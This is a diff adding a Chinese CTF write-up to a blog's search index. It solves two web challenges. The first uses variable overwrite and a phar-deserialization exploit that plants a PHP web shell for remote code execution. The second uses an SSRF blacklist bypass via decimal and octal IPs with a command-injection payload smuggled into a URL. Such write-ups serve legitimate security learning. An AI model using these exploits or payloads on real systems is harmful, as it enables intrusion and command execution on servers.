@@ -9453,4 +9453,181 @@ echo urlencode(serialize($a));</code></pre>
         <tag>WriteUp</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Desctf12月月赛</title>
+    <url>//articles/desctf12.html</url>
+    <content><![CDATA[<h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>题目给出源码：</p>
+<pre><code class="php"> &lt;?php
+error_reporting(E_ALL);
+$sandbox = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+if(!is_dir($sandbox)) {
+    mkdir($sandbox);
+}
+include_once(&#39;template.php&#39;);
+$template = array(&#39;tp1&#39;=&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;=&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;=&gt;&#39;tp3.tpl&#39;);
+if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) {
+    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);
+} else {
+    highlight_file(__file__);
+    die();
+}
+if(isset($_GET[&#39;tp&#39;])) {
+    $tp = $_GET[&#39;tp&#39;];
+    if (array_key_exists($tp, $template) === FALSE) {
+        echo &quot;No! You only have 3 template to reader&quot;;
+        die();
+    }
+    $content = file_get_contents($template[$tp]);
+    $temp = new Template($content);
+} else {
+    echo &quot;Please choice one template to reader&quot;;
+}
+?&gt; </code></pre>
+<ul>
+<li>这里存在一个变量覆盖<code>extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);</code>，只需覆盖<code>$template</code></li>
+</ul>
+<p>即可,读取任意文件，直接读取template.php,得到源码：</p>
+<pre><code class="PHP">http://8.129.41.25:10305/?var[template][a]=template.php&amp;tp=a</code></pre>
+<ul>
+<li>template.php</li>
+</ul>
+<pre><code class="PHP">&lt;?php
+class Template{
+    public $content;
+    public $pattern;
+    public $suffix;
+
+    public function __construct($content){
+        $this-&gt;content = $content;
+        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+        $this-&gt;suffix = &quot;.html&quot;;
+    }
+
+    public function __destruct() {
+        $this-&gt;render();
+    }
+    public function render() {
+        while (True) {
+            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1) 
+                break;
+            global ${$matches[1]};
+
+            if(isset(${$matches[1]})) {
+                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
+            } 
+            else{
+                break;
+            }
+        }
+        if(strlen($this-&gt;suffix)&gt;5) {
+            echo &quot;error suffix&quot;;
+            die();
+        }
+        $filename = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
+        file_put_contents($filename, $this-&gt;content);
+        echo &quot;Your html file is in &quot; . $filename;
+    }
+}
+
+?&gt;</code></pre>
+<p>源码比较简单，在前面的源码通过<code>file_getcontents</code>读取到内容之后传入<code>Template</code>类再写入文件。由于<code>file_getcontents</code>的参数完全可控，我们可以远程下载文件到靶机，并且可以使用phar反序列化可以控制<code>suffix</code>属性，把写入文件的后缀改成PHP，导致rce.</p>
+<p>Exp:</p>
+<pre><code class="php">&lt;?php
+class Template{
+ public $content;
+ public $pattern;
+ public $suffix;
+
+ public function __construct($content){
+  $this-&gt;content = $content;
+  $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+  $this-&gt;suffix = &quot;.php&quot;;
+ }
+}
+    @unlink(&quot;test.phar&quot;);
+    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
+    $o = new Template(&quot;&lt;?php system(\$_GET[_]);?&gt;&quot;);
+    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
+    $phar-&gt;stopBuffering();
+?&gt;</code></pre>
+<ul>
+<li>下载到靶机：</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175549@2x.png" alt="WX20201225-175549@2x"></p>
+<ul>
+<li>反序列化</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175738@2x.png" alt="WX20201225-175738@2x"></p>
+<ul>
+<li>读取flag</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175957@2x.png" alt="WX20201225-175957@2x"></p>
+<h1 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h1><p>源码：</p>
+<pre><code class="javascript">/routes/index.js
+var express = require(&#39;express&#39;);
+var config = require(&#39;../config&#39;);
+var url=require(&#39;url&#39;);
+var child_process=require(&#39;child_process&#39;);
+var fs=require(&#39;fs&#39;);
+var request=require(&#39;request&#39;);
+var router = express.Router();
+
+
+var blacklist=[&#39;127.0.0.1.xip.io&#39;,&#39;::ffff:127.0.0.1&#39;,&#39;127.0.0.1&#39;,&#39;0&#39;,&#39;localhost&#39;,&#39;0.0.0.0&#39;,&#39;[::1]&#39;,&#39;::1&#39;];
+
+router.get(&#39;/&#39;, function(req, res, next) {
+    res.json({});
+});
+
+router.get(&#39;/debug&#39;, function(req, res, next) {
+    console.log(req.ip);
+    if(blacklist.indexOf(req.ip)!=-1){
+        console.log(&#39;res&#39;);
+    var u=req.query.url.replace(/[\&quot;\&#39;]/ig,&#39;&#39;);
+    console.log(url.parse(u).href);
+    let log=`echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log`;
+    console.log(log);
+    child_process.exec(log);
+    res.json({data:fs.readFileSync(&#39;/tmp/log&#39;).toString()});
+    }else{
+        res.json({});
+    }
+});
+
+
+router.post(&#39;/debug&#39;, function(req, res, next) {
+    console.log(req.body);
+    if(req.body.url !== undefined) {
+        var u = req.body.url;
+    var urlObject=url.parse(u);
+    if(blacklist.indexOf(urlObject.hostname) == -1){
+        var dest=urlObject.href;
+        request(dest,(err,result,body)=&gt;{
+            res.json(body);
+        })
+    }
+    else{
+        res.json([]);
+    }
+    }
+});
+module.exports = router;</code></pre>
+<ul>
+<li><p>GET 的debug路由中有一个命令执行，会将结果写入<code>/tmp/log</code>,但是要进入这个命令执行的分支必须通过ip黑名单的检测。`blacklist.indexOf(req.ip)!=-1。</p>
+</li>
+<li><p>我们在来看POST的debug路由很明显是一个SSRF。这里传递一个参数url,URL经过：url.parse解码后hostname不能再黑名单中。黑名单过滤的不全我们完全可以用十进制胡总八进制的方式绕过例如：<code>http://2130706433/</code>、<code>http://0177.0.0.01/</code></p>
+</li>
+<li><p>绕过SSRF之后我们就是要闭合单引号来执行多条命令了，这里有一个trick在<code>@</code>符号之前输入<code>%27</code>，会经过url解码变成单引号。</p>
+</li>
+</ul>
+<p>所以最终payload是：</p>
+<pre><code>url= http://2130706433:10300/debug?url=http://%2527@1;cp$IFS$9/flag$IFS$9/tmp/log;%23</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG9620.png" alt="WechatIMG9620"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
